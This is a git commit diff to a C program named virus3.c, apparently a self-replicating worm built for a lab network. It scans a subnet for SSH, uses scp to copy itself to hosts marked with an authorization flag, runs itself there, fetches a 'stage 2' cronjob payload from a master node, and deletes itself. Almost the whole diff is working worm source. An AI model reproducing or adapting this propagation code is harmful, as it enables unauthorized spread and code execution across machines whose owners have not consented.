bc317914e4f94cbd9d22780fdf44bbbb7892d159
LucasVanHaaren <29121316+LucasVanHaaren@users.noreply.github.com>
2025-01-17 19:49:14 +0100

    feat: multiple changes
    - fix of is_master_node function which was broken
    - add stage1 payload execution

--- virus3.c
+++ virus3.c
@@ -1,26 +1,25 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdbool.h>
 #include <string.h>
 #include <unistd.h>
 #include <time.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <netdb.h>
+#include <ifaddrs.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <sys/wait.h>
 #include <sys/time.h>
-#include <stdbool.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <arpa/inet.h>
-#include <netdb.h>
+#include <sys/types.h>
 
 #define FILENAME_SIZE 30
 #define BUFFER_SIZE 256
 #define SOCKET_TIMEOUT 1
 #define VIRUS_WOKRING_DIR "/dev/shm"
+#define MASTER_WORKING_DIR "/tmp/virus"
+#define STAGE_2_PAYLOAD "admin.cronjob"
 #define ALLOWED_FLAG ".datav"
 #define INFECTED_FLAG ".infected"
 
@@ -41,6 +40,7 @@ void generate_random_seed(char *seed) {
     }
 }
 
+// check if remote host is authorized to be infected
 bool is_authorized(char *ip) {
     char cmd_buffer[256];
     snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s > /dev/null 2>&1", ip, VIRUS_WOKRING_DIR, ALLOWED_FLAG);
@@ -51,6 +51,7 @@ bool is_authorized(char *ip) {
     }
 }
 
+// check if remote host is already infected
 bool is_infected(char *ip) {
     char cmd_buffer[256];
     snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s stat %s/%s > /dev/null 2>&1", ip, VIRUS_WOKRING_DIR, INFECTED_FLAG);
@@ -61,35 +62,46 @@ bool is_infected(char *ip) {
     }
 }
 
-bool is_master_node(char *ip) {
-    char hostbuffer[256];
-    struct hostent *host_entry;
-    int hostname;
-    struct in_addr **addr_list;
+// check if the local machine has the given ip addr
+bool is_master_node(const char *ip) {
+    struct ifaddrs *ifaddr, *ifa;
+    bool has_ip = false;
 
-    // retrieve hostname
-    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
-    if (hostname == -1) {
-        perror("gethostname error");
-        exit(1);
+    // get all net ifaces
+    if (getifaddrs(&ifaddr) == -1) {
+        perror("getifaddrs");
+        return false;
     }
-    // retrieve IP addresses from this hostname
-    host_entry = gethostbyname(hostbuffer);
-    if (host_entry == NULL) {
-        perror("gethostbyname error");
-        exit(1);
+
+    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL) {
+            continue;
+        }
+        // for all ipv4 addresses
+        if (ifa->ifa_addr->sa_family == AF_INET) {
+            struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
+            char addr_buf[INET_ADDRSTRLEN];
+            // get ip as string
+            if (!inet_ntop(AF_INET, &sa->sin_addr, addr_buf, sizeof(addr_buf))) {
+                perror("inet_ntop");
+                continue;
+            }
+            // compare to specified ip
+            if (strcmp(addr_buf, ip) == 0) {
+                has_ip = true;
+                break;
+            }
+        }
     }
-    addr_list = (struct in_addr **) host_entry->h_addr_list;
-    for (int i = 0; addr_list[i] != NULL; i++) {
-        if(strcmp(ip, inet_ntoa(*addr_list[i])) == 0) return true;
-    }
-    return false;
+    freeifaddrs(ifaddr);
+    return has_ip;
 }
 
-void execute_payload(char *virus_name, char *target_ip_buff) {
+// upload virus on remote target, execute payload and flag it as infected
+int replicate_to_host(char *virus_name, char *target_ip_buff) {
     char cmd_buffer[BUFFER_SIZE],
         rnd_name_buffer[FILENAME_SIZE];
-    // copy virus in tmpfs
+    // drop virus in tmpfs
     generate_random_string(rnd_name_buffer);
     snprintf(cmd_buffer, sizeof(cmd_buffer), "scp %s debian@%s:%s/%s > /dev/null 2>&1", virus_name, target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
     if(system(cmd_buffer) == 0) {
@@ -98,8 +110,17 @@ void execute_payload(char *virus_name, char *target_ip_buff) {
         system(cmd_buffer);
         // exec payload on target host
         snprintf(cmd_buffer, sizeof(cmd_buffer), "ssh debian@%s %s/%s > /dev/null 2>&1", target_ip_buff, VIRUS_WOKRING_DIR, rnd_name_buffer);
-        system(cmd_buffer);
+        return system(cmd_buffer);
+    } else {
+        return -1;
     }
+}
+
+// fetch the stage 2 payload from master node (actually a simple cronjob script)
+void execute_stage_1(char *master_ip) {
+    char cmd_buffer[BUFFER_SIZE];
+    snprintf(cmd_buffer, sizeof(cmd_buffer), "scp lucas@%s:%s/%s %s", master_ip, MASTER_WORKING_DIR, STAGE_2_PAYLOAD, VIRUS_WOKRING_DIR);
+    system(cmd_buffer);
 }
 
 void self_delete(char *program_name) {
@@ -108,9 +129,9 @@ void self_delete(char *program_name) {
 }
 
 int main(int argc, char **argv) {
-    char base_ip_range[] = "192.168.122.",
-        master_ip[] = "192.168.122.1";
-    int port = 22,
+    char base_ip_range[]    = "192.168.122.",
+        master_ip[]         = "192.168.122.1";
+    int port        = 22,
         first_host  = 2,
         last_host   = 254;
     char seed;
@@ -131,6 +152,7 @@ int main(int argc, char **argv) {
         if (pid == 0) {
             // generate prng from child specific seed
             srand(seed ^ (getpid()<<16));
+
             int sock;
             char target_ip_buff[32];
             struct sockaddr_in server_addr;
@@ -147,8 +169,8 @@ int main(int argc, char **argv) {
             // set timeout to close socket after X seconds without response
             timeout.tv_sec = SOCKET_TIMEOUT;
             timeout.tv_usec = 0;
-            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
-            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
+            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*) &timeout, sizeof(timeout));
+            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*) &timeout, sizeof(timeout));
             
             // build server_addr struct from string representation
             memset(&server_addr, 0, sizeof(server_addr));
@@ -162,9 +184,9 @@ int main(int argc, char **argv) {
 
             // try socket connection
             if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
-                // execute payload
-                if(!is_master_node(master_ip) && is_authorized(target_ip_buff) && !is_infected(target_ip_buff)) {
-                    execute_payload(argv[0], target_ip_buff);
+                // replicate to others nodes if both authorized an not already infected
+                if(is_authorized(target_ip_buff) && !is_infected(target_ip_buff)) {
+                    replicate_to_host(argv[0], target_ip_buff);
                 }
             }
             close(sock);
@@ -175,6 +197,12 @@ int main(int argc, char **argv) {
     // wait all childs
     for (int i = first_host; i <= last_host; i++) {
         wait(NULL);
+    }
+
+    // FOR CLIENT NODES ONLY : execute payload locally
+    if(!is_master_node(master_ip)) {
+        execute_stage_1(master_ip);
+        self_delete(argv[0]);
     }
 
     return 0;
